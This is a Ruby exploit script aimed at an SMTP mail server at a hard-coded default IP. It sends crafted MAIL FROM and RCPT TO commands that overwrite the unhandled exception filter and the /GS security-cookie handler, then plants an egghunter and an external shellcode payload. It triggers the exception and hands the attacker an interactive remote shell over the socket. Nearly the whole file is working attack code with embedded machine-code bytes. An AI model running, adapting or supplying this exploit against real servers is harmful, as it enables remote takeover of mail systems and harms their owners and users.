require 'socket'
require '/home/john/dev/libbouncer.rb'

#puts "USING MASS INT3 !!!" if $DEBUG

targeth = ARGV[0] || '193.168.50.89'
targetp = ARGV[1] || 25

mallocoffset = ARGV[2].to_i || 32

ueh_addr = (Integer(ARGV[3].to_s) rescue 0x77eb73b4)
p "ueh: %x" % ueh_addr

userhandler_addr = 0x00409750
gs_cookie_addr = 0x004090b8

ueh_source = <<EOS
; nasm suxx
mov eax, [esp+4] ; get ueh argument
mov eax, [eax+4] ; get ptr to context

lea eax, [eax+0x40]
; regs: eax+
;  5C: edi  60: esi ebx edx ecx  70: eax ebp eip

cmp dword [eax+0x78], 0x004013c6
jnz getout

add dword [eax+0x78], 0x07 ; fix eip
mov dword [eax+0x6c], 0x0040dead ; ecx -> gscookie - 40

or eax, -1 ; continue execution
retloc:
retn 4
getout:
xor eax, eax
jmp retloc
EOS

ueh =
#($DEBUG ? "\xcc" : '')+
"\x8b\x44\x24\x04"+
"\x8b\x40\x04"+
"\x8d\x40\x40"+
 "\x81\x78\x78\xc6\x13\x40\x00"+
 "\x75\x11"+
"\x83\x40\x78\x07"+
"\xc7\x40\x6c" + [gs_cookie_addr - 40].pack('L') +
"\x83\xc8\xff"+
"\xc2\x04\x00"+
 "\x31\xc0"+
 "\xeb\xf9"

egghunt_src = <<EOS
lea edi, [eax + 0x10]	; eax is our address, skip the instruction containing the egg
or ecx, 0xffffffff
mov eax, 0x41414141
repnz scasd		; find the chunk
repnz scasd		; find the final buffer
jmp edi
EOS

egghunt =
#($DEBUG ? "\xcc" : '')+
"\x8d\x78\x10"+
"\x83\xc9\xff"+
"\xb8\x41\x41\x41\x41"+
"\xf2\xaf"+
"\xf2\xaf"+
"\xff\xe7"

egg = "\x41"*7 
egg += "\xcc" if $DEBUG

shellcode = File.read 'l12.payload'

TCPSocket.open(targeth, targetp) { |sock|
	puts sock.gets
	puts "Sending the 1st MAIL FROM"
	sock.write "MAIL FROM:pute\r\n"
	puts sock.gets
	puts "Sending the 1st RCPT TO"
	sock.write "RCPT TO:pute2\r\n"
	puts sock.gets
	
	# Overwrite du UEF
	mailfrom = "A"*140
	mailfrom[0x20+40,4] = [ueh_addr-40].pack('L')
	puts "Sending the 2nd MAIL FROM"
	sock.write "MAIL FROM:" + mailfrom + "\r\n"
	puts sock.gets
	# Le UEF va pointer sur l'écraseur de cookie
	puts "Sending the 2nd RCPT TO (to overwrite the UEF)"
	sock.write "RCPT TO:" + ueh + "\r\n"
	puts sock.gets
	
	# On overwrite le handler du /GS 
	mailfrom = "kikoololasv" * 8
	mailfrom[0x20+40,4] = [userhandler_addr-40].pack('L')
	puts "Sending the 3rd MAIL FROM"
	sock.write "MAIL FROM:" + mailfrom + "\r\n"
	puts sock.gets
	# Le UEF va pointer sur l'egghunt
	puts "Sending the 3rd RCPT TO (to overwrite the /GS handler)"
	sock.write "RCPT TO:" + egghunt + "\r\n"
	puts sock.gets
	
	# Egg
	puts "Sending the Payload !"
	sock.write "DATA\r\n"
	puts sock.gets
	sock.write egg # + "\r\n"
	sock.write shellcode + "\r\n\r\n"
	puts sock.gets
	
	# Trigger d'UEF
	mailfrom[0x20+40,4]=[0xDEADBABE].pack('L')
	puts "Sending the 4th MAIL FROM"
	sock.write "MAIL FROM:" + mailfrom + "\r\n"
	puts sock.gets
	puts "Sending the 4th RCPT TO (to trigger the UEF)"
	sock.write "RCPT TO:owned\r\n"
	puts sock.gets
	
	puts "Sending QUIT"
	sock.write "QUIT\r\n"
	puts sock.gets
	
	sleep 2
	puts "Output from the sploit:"
	sock.write "dir\r\n"

	bounce($stdin, sock, sock, $stdout, 60)
#	loop do
#		s = sock.gets
#		break if not s or s.empty?
#		puts s
#	end
}
puts "done"
